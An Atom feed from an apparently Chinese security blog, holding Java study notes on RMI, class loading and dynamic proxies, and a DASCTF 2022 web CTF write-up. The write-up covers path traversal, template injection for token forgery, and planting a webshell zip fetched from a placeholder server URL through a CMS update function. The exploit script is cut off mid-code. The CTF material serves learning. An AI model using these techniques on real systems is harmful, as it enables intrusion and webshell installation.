<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雾雨散花</title>
  
  
  <link href="https://wuyusanhua2021.github.io/atom.xml" rel="self"/>
  
  <link href="https://wuyusanhua2021.github.io/"/>
  <updated>2022-07-14T06:32:14.829Z</updated>
  <id>https://wuyusanhua2021.github.io/</id>
  
  <author>
    <name>wuyusanhua</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java学习笔记-RMI机制</title>
    <link href="https://wuyusanhua2021.github.io/2022/07/13/Java%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94RMI%E6%9C%BA%E5%88%B6/"/>
    <id>https://wuyusanhua2021.github.io/2022/07/13/Java%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94RMI%E6%9C%BA%E5%88%B6/</id>
    <published>2022-07-13T02:22:06.000Z</published>
    <updated>2022-07-14T06:32:14.829Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>RMI（Remote Method Invocation）全称远程方法调用，是分布式编程中的重要思想，它能够让一个JVM调用另外一个JVM中的对象的方法</p><h1 id="设计模式与交互过程"><a href="#设计模式与交互过程" class="headerlink" title="设计模式与交互过程"></a>设计模式与交互过程</h1><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p><strong>RMI的设计模式包含三个重要角色：</strong></p><ul><li>客户端（Client）：远程方法的使用者，从注册中心获取远程方法的信息并调用</li><li>服务端（Server）：远程方法的提供者，向注册中心注册自己提供的服务</li><li>注册中心（Registry）：以url的形式注册远程对象，并向客户端回复对远程对象的调用</li></ul><p><strong>RMI的核心——远程对象：</strong></p><ul><li>存在于Server，被Client调用</li><li>可以远程调用的对象必须实现<code>java.rmi.Remote</code>接口</li><li>实现类必须继承<code>UnicastRemoteObject</code>类，否则需要手动初始化对象</li><li>构造方法需要用super()来调用父类的构造方法，即<code>UnicastRemoteObject.exportObject</code>方法</li><li>远程对象可能有多个方法，但只有被声明的才能远程调用</li><li>实现类中使用的对象必须都继承<code>java.io.Serialzable</code></li></ul><p><strong>Stub和Skeleton：</strong></p><p>RMI采用代理的方式处理Client与Server之间Socket通信的细节，存根（Stub）是Client的代理，骨干网（Skeleton）是Server的代理</p><p>Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。</p><p><strong>远程引用层：</strong></p><p>在Client解析并执行远程引用协议；在Server处理引用后向骨架发送远程方法调用</p><p><strong>传输层：</strong></p><p>在Client发送调用，传递远程方法参数，接收远程方法执行结果；在Server监听Client的入站链接，接收并转发到远程引用层</p><h2 id="交互过程"><a href="#交互过程" class="headerlink" title="交互过程"></a>交互过程</h2><p>这里有一张相关的流程图，讲的很清晰</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220713134612894.png" alt="image-20220713134612894"></p><p>概括一下就是：Server在本地创建远程对象并把远程对象注册到Registry，然后Client访问Regitry查找注册的远程对象，Registry将这个对象的存根发送给Client，凭借存根和Server的骨架通信，骨架代理再调用方法并将方法执行的结果返回给Client存根，最终Client收到存根代理返回的方法执行结果，也就是说本质上远程方法是在Server端完成了执行，Client端只是收到了方法最终的执行结果</p><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>按照规则实现远程对象相关的接口和类</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220714132058581.png" alt="image-20220714132058581"></p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220714132116191.png" alt="image-20220714132116191"></p><p>Server相关类</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220714134227923.png" alt="image-20220714134227923"></p><p>Client相关类</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220714134519453.png" alt="image-20220714134519453"></p><p>先运行Server类创建远程对象和注册中心，再运行Client类就能成功调用远程方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;RMI（Remote Method Invocation）全称远程方法调用，是分布式编程中的重要思想，它能够让一个JVM调用另外一个JVM中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java学习笔记-类的动态加载</title>
    <link href="https://wuyusanhua2021.github.io/2022/07/11/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>https://wuyusanhua2021.github.io/2022/07/11/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/</id>
    <published>2022-07-11T06:20:42.000Z</published>
    <updated>2022-07-14T06:07:20.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ClassLoader是Java的类加载器，在Java程序运行过程中负责读取编译好的class文件，并将其中的字节代码转换成<code>java.lang.Class</code>类的一个实例</p><p>大部分的类加载器都是<code>java.lang.ClassLoader</code>的实例，以下是该类常见的一些方法</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getParent()</td><td>返回该类加载器的父类加载器</td></tr><tr><td>loadClass(String name)</td><td>加载名称为name的类，返回Class实例</td></tr><tr><td>findClass(String name)</td><td>查找名称为name的类，返回Class实例</td></tr><tr><td>findLoadedClass(String name)</td><td>查找名称为name的已经被加载过的类，返回Class实例</td></tr><tr><td>defineClass(String name, byte[] b, int off, int len)</td><td>把字节数组b中的内容转换为Java类，该方法被声明为final</td></tr><tr><td>resolveClass(Class&lt;?&gt; c)</td><td>链接指定的Java类</td></tr></tbody></table><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>类加载器一共分为四类：</p><ul><li>启动类加载器（BootstrapClassLoader）：加载Java核心库，由原生代码(CPP)实现，并非继承自<code>java.lang.ClassLoader</code></li><li>扩展类加载器（ExtensionClassLoader）：在JVM提供的扩展库目录里查找并加载Java类</li><li>应用类加载器（ApplicationClassLoader）：加载CLASSPATH下的所有Java类，<strong>一般为默认类加载器</strong></li><li>用户自定义类加载器（UserClassLoader）：用户也可以继承<code>java.lang.ClassLoader</code>来实现自定义的类加载器</li></ul><p>这几种类加载器之前存在着一定的层次关系，具体如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BootstrapClassLoader </span>&lt;— <span class="keyword">ExtensionClassLoader </span>&lt;— ApplicationClassLoader &lt;— UserClassLoader</span><br></pre></td></tr></table></figure><p>所谓的双亲委派机制实际上指的是：当一个类加载器要加载一个类时，它首先会把这个加载的请求委托给它的父类加载器，只有当父类加载器无法加载这个类时，才会由该类加载器自身去加载</p><p>也就是说，当需要加载一个类时，整个流程会是当前的类加载器向上一层发送委托请求，每一层都不断重复委托，一直到最顶层的BootstrapClassLoader，然后再从BootstrapClassLoader开始，按照层级一层一层往下判断那一层的类加载器是否能加载这个类，是则用这一层的类加载器来加载类并终止流程，否则继续转向下一层，直到最开始发送委托的类加载器</p><h1 id="类的动态加载方式"><a href="#类的动态加载方式" class="headerlink" title="类的动态加载方式"></a>类的动态加载方式</h1><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>上文提到了一些<code>java.lang.ClassLoader</code>类的方法，其中有三个比较关键的方法，任何类的加载都会调用到这三个方法，它们分别是：</p><ul><li>loadClass</li><li>findClass</li><li>defineClass</li></ul><p>这些方法的调用也会有一定的顺序，加载类时，首先调用loadClass方法以双亲委派机制寻找类，如果没有找到，就调用findClass方法在远程服务器或jar包等位置寻找类，最后调用defineClass方法处理读取到的字节码，产生Java类</p><p>可以发现在这几个方法中，真正承担了生成Java类任务的是defineClass方法，由于defineClass方法被protected关键字修饰，所以得使用反射的方式来调用</p><p>编译一个Test.class文件，源文件代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220711185535755.png" alt="image-20220711185535755"></p><p>反射调用defineClass来加载Test.class</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220711193236146.png" alt="image-20220711193236146"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>URLClassLoader是AppClassLoader的父类，支持file，http，jar等协议，可以用来加载文件系统目录，jar包和远程http服务的class文件</p><p>使用方式如下：</p><p>使用file协议</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220711220830872.png" alt="image-20220711220830872"></p><p>使用http协议，在放class文件的文件夹起一个http服务</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220711223521955.png" alt="image-20220711223521955"></p><p>之后只要将file协议的文件路径改为http协议的即可</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220711221211630.png" alt="image-20220711221211630"></p><h2 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a>Unsafe</h2><p>Unsafe为Java底层的一个类，负责执行一些非常底层，不安全操作的方法，这个类中也提供了一个defineClass方法，Unsafe里面的defineClass方法虽然是public的，但是由于Unsafe类的构造被私有化，对外只提供了一个静态方法获取当前Unsafe实例，因此要想办法获取theUnsafe对象</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220711222626742.png" alt="image-20220711222626742"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ClassLoader&quot;&gt;&lt;a href=&quot;#ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;ClassLoader&quot;&gt;&lt;/a&gt;ClassLoader&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java学习笔记-动态代理机制</title>
    <link href="https://wuyusanhua2021.github.io/2022/05/28/Java%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <id>https://wuyusanhua2021.github.io/2022/05/28/Java%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</id>
    <published>2022-05-28T07:04:51.000Z</published>
    <updated>2022-07-14T06:07:28.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>正常情况下一般是通过new关键字直接初始化，在代码还未运行时就确定了要运行的类，而反射的思路不同，一开始代码并不知道要初始化的类对象是什么，直到运行时才得知要运行的类</p><p>在反射中，要获取一个类或调用一个类的方法，首先要获取到该类的Class对象，对此Java提供了三种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当知道类的全路径名时可以用Class.forName静态方法</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对编译前就知道操作的Class,可以用.class方法</span></span><br><span class="line">Class clazz = String.class;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类对象的getClass()方法</span></span><br><span class="line">Srting str = <span class="keyword">new</span> String(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">Class clazz = str.getClass();</span><br></pre></td></tr></table></figure><p>通过反射创捷类对象的方式有两种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过Class的newInstance()方法（只能使用默认的构造方法）</span></span><br><span class="line">Class clazz = Student.class;</span><br><span class="line">Student student = (Student) clazz.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过constructor的newInstance()方法（可选择特定的构造方法）</span></span><br><span class="line">Class clazz = Student.class;</span><br><span class="line">Constructor constructor = clazz.getConstructor();</span><br><span class="line">Student student = (Student) constructor.newInstance();</span><br></pre></td></tr></table></figure><p>若要获取类的属性，方法，构造器，可以通过Class对象的<code>getFields()</code>和<code>getDeclaredFields()</code>方法，前者无法获取私有属性，后者可以获取所有属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Student.class;</span><br><span class="line">Field[] fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure><p>其它的一些方法</p><table><thead><tr><th>方法名</th><th>功能说明</th></tr></thead><tbody><tr><td>getName()</td><td>返回此Class对象所表示的实体(类,接口,数组类,void)的名称</td></tr><tr><td>Class getSuperClass()</td><td>返回当前Class对象的父类的Class对象</td></tr><tr><td>Class[] getInterfaces()</td><td>返回当前Class对象的接口</td></tr><tr><td>ClassLoader getClassLoader()</td><td>返回该类的类加载器</td></tr><tr><td>Method getMethod(String name, Class.. T)</td><td>返回一个Method对象，此对象的形参类型为paramType</td></tr></tbody></table><h1 id="代理模式简介"><a href="#代理模式简介" class="headerlink" title="代理模式简介"></a>代理模式简介</h1><p>代理模式是一种设计模式，为其他对象提供一种代理以控制对这个对象的访问</p><p>由抽象角色，真实角色和代理角色三部分组成：</p><ul><li>抽象角色：一套接口或抽象类，声明真实角色实现的方法</li><li>真实角色：实现抽象角色，定义要实现的业务逻辑，供代理角色调用</li><li>代理角色：实现抽象角色，是真实角色的代理，通过真实角色的业务逻辑来实现抽象方法，并可以附加自己的操作</li></ul><p>通过这种机制，就可以在不修改真实角色的情况下额外扩展它的功能</p><h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>静态代理是指通过声明一个明确的代理类来访问源对象的代理方法</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Work</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I&#x27;m studying...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentProxy</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Student student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before study...&quot;</span>);</span><br><span class="line">        student.Work();</span><br><span class="line">        System.out.println(<span class="string">&quot;After study...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这种方式简单且便于理解，但是当需要代理的类数量很多时，写代理类就会很麻烦，反而让代码变得很繁琐，而动态代理机制则解决了这个问题</p><h1 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>动态代理无需声明式的创建Java代理类，而是在运行过程中生成“虚拟”的代理类，被ClassLoader加载，从而避免了静态代理那样需要声明大量的代理类</p><p>JDK提供了<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口，二者互相配合就能实现动态代理</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>Person接口和Student类不变，新增一个<code>StudentInvocationHandler</code>类，该类实现了<code>InvocationHandler</code>接口并重写了invoke方法，这个invoke方法很关键，所有执行代理对象的方法都会被替换成执行invoke方法，然后通过反射在invoke方法中执行代理类的方法，代理过程中同样可以进行功能扩展</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220529132524586.png" alt="image-20220529132524586"></p><p>创建动态代理对象的步骤也要做些修改</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220529165600271.png" alt="image-20220529165600271"></p><p>这段代码的流程是：把StudentInvocationHandler看作一个中间类，生成了一个持有被代理对象Student的中间对象studentHandler，然后调用Proxy类的newProxyInstance方法生成代理对象，其中studentHandler作为一个参数被传入，那么下面调用代理对象的每个方法内部都会调用studentHandler.invoke()，studentHandler对象成了代理对象和源对象的桥梁</p><h1 id="Cglib动态代理"><a href="#Cglib动态代理" class="headerlink" title="Cglib动态代理"></a>Cglib动态代理</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>有的情况下，源对象是没有实现接口的，这种时候就要用到Cglib代理，其原理是在内存中创建一个子类，并在子类中拦截对父类方法的调用，然后加入自己的操作</p><p>Spring5.x中默认使用Cglib作为动态代理实现，Spring Boot也可以设置为使用Cglib</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>被代理类Student依然一样，只是不存在Person接口，新增一个CglibProxy类，包含getProxyObject和intercept两个方法</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220529232703184.png" alt="image-20220529232703184"></p><p>getObjectProxy方法作用是动态生成一个新的类，其调用的Enhancer类是一个字节码增强器，负责对要处理的类进行扩展，通过它就能设置父类，回调方法；intercept方法则实现了一个拦截器，负责进行功能增强</p><p>使用代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220529234401082.png" alt="image-20220529234401082"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反射&quot;&gt;&lt;a href=&quot;#反射&quot; class=&quot;headerlink&quot; title=&quot;反射&quot;&gt;&lt;/a&gt;反射&lt;/h1&gt;&lt;p&gt;正常情况下一般是通过new关键字直接初始化，在代码还未运行时就确定了要运行的类，而反射的思路不同，一开始代码并不知道要初始化的类对象是什么，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DASCTF2022MAY-Web复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/05/24/DASCTF2022MAY-Web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/05/24/DASCTF2022MAY-Web%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-05-24T02:52:13.000Z</published>
    <updated>2022-05-26T02:52:50.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="getme"><a href="#getme" class="headerlink" title="getme"></a>getme</h1><p>考察<a href="https://blog.csdn.net/weixin_46187013/article/details/122454511">Apache2.4.50的路径遍历和文件泄露漏洞(CVE-2021-42013)</a></p><p><code>/flag</code>是假flag，用<code>cat /usr/local/apache2/logs/* | grep 200</code>可以找到真flag所在路径</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220524141946945.png" alt="image-20220524141946945"></p><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p><code>/list</code>路由就相当于提供一个查询功能，如果存在<code>xxx.go</code>就会执行这个go文件</p><p><code>/upload</code>提供文件上传功能，先传一个<code>exp.go</code>，内容就是go语言的命令执行，虽然回显<code>Sorry there doesn&#39;t seem to be a exp.go.go file</code>，但是<code>exp.go</code>本身已经传上去了</p><p>再传一个<code>exp</code>，就能执行<code>exp.go</code>然后得到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220525121825211.png" alt="image-20220525121825211"></p><h1 id="fxxkgo"><a href="#fxxkgo" class="headerlink" title="fxxkgo"></a>fxxkgo</h1><p><code>rootHandler</code>里面用到了模板，可能存在模板注入</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   token := c.GetHeader(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">      id, _ := jwt_decode(token)</span><br><span class="line">      acc := get_account(id)</span><br><span class="line">      tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      &#125;</span><br><span class="line">      tpl.Execute(c.Writer, &amp;acc)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是在<code>/register</code>路由注册id为<code>&#123;&#123;.&#125;&#125;</code>的用户，然后去<code>/auth</code>路由获取token</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220525142458554.png" alt="image-20220525142458554"></p><p>把token添加为X-Token头，获取secret_key，即可伪造token</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220525143050715.png" alt="image-20220525143050715"></p><p>用伪造好的token访问<code>/flag</code></p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220525143159116.png" alt="image-20220525143159116"></p><h1 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h1><p>登录后台要密码和验证码，认证码在配置文件<code>/libs/config.php</code>里，密码是弱密码123456,不过后台也没啥东西，看出题人wp的意思这里真就只能嗯审了:(</p><p>在<code>/sys/apps/controller/admin/Update.php</code>中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$zipurl</span> = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">&#x27;url&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">   <span class="variable">$token</span> = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">&#x27;token&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$zipurl</span>)) <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;更新包地址为空&#x27;</span>);</span><br><span class="line">   <span class="variable">$md5</span> = md5(<span class="variable">$zipurl</span>.Mc_Encryption_Key);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//下载文件</span></span><br><span class="line">   <span class="variable">$zipurl</span> = sys_auth(<span class="variable">$zipurl</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$zipurl</span>)) <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;更新包地址错误&#x27;</span>);</span><br><span class="line">   <span class="comment">//获取文件头信息</span></span><br><span class="line">   <span class="variable">$arr</span> = get_headers(<span class="variable">$zipurl</span>,<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="string">&#x27;Content-Type&#x27;</span>] !== <span class="string">&#x27;application/zip&#x27;</span>) <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;压缩包不zip类型文件&#x27;</span>);</span><br><span class="line">   <span class="variable">$data</span> = getcurl(<span class="variable">$zipurl</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>)) <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;获取压缩包失败&#x27;</span>);</span><br><span class="line">   <span class="variable">$file_zip</span> = FCPATH.<span class="string">&quot;caches/upzip/&quot;</span>.end(explode(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$zipurl</span>));</span><br><span class="line">   <span class="keyword">if</span>(!file_put_contents(<span class="variable">$file_zip</span>, <span class="variable">$data</span>)) <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;压缩包下载失败&#x27;</span>);</span><br><span class="line">   <span class="comment">//解压</span></span><br><span class="line">   <span class="keyword">$this</span>-&gt;load-&gt;library(<span class="string">&#x27;mczip&#x27;</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;mczip-&gt;PclZip(<span class="variable">$file_zip</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mczip-&gt;extract(PCLZIP_OPT_PATH, FCPATH, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">           unlink(<span class="variable">$file_zip</span>);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;文件解压失败，或者没有权限覆盖文件~！&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      unlink(<span class="variable">$file_zip</span>);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;msg(<span class="string">&#x27;版本升级成功~！&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是通过访问其它url来获取zip，然后解压zip到网站主目录</p><p>在自己的vps上起一个服务，放一个有一句话木马的zip，调用这个函数下载zip就能传马了</p><p>因为函数里面调用了<code>sys_auth()</code>来编码url，所以得写个脚本来生成一下payload</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sys_auth</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$expiry</span> = <span class="number">0</span></span>) </span>&#123;...&#125; <span class="comment">//把sys_auth复制过来</span></span><br><span class="line">define(<span class="string">&#x27;Mc_Encryption_Key&#x27;</span>,<span class="string">&#x27;GKwHuLj9AOhaxJ2&#x27;</span>);  <span class="comment">//需要指定全局变量Mc_Encryption_Key的值</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;http://vps_ip/hack.zip&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> sys_auth(<span 